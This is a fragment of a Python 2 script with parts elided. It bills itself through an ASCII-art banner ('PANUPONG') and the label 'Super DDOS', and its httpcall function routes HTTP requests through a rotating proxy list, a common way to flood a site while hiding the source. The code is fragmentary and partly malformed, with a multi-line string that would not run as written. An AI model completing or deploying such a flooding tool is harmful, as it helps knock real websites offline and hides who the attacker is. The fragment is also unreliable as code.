...
def httpcall(url):
	...
	proxy = urllib.ProxyHandler({'http':listaproxy[index]})
	opener = urllib.build_opener(proxy,urllib.HTTPHandler)
...
#Main
print ' _____        _   _ _    _ _____   ____  _   _  _____ 
|  __ \ /\   | \ | | |  | |  __ \ / __ \| \ | |/ ____|
| |__) /  \  |  \| | |  | | |__) | |  | |  \| | |  __ 
|  ___/ /\ \ | . ` | |  | |  ___/| |  | | . ` | | |_ |
| |  / ____ \| |\  | |__| | |    | |__| | |\  | |__| |
|_| /_/    \_\_| \_|\____/|_|     \____/|_| \_|\_____|'
print '\t  ==> #~~ Super  DDOS ~~# <==  '
# Site
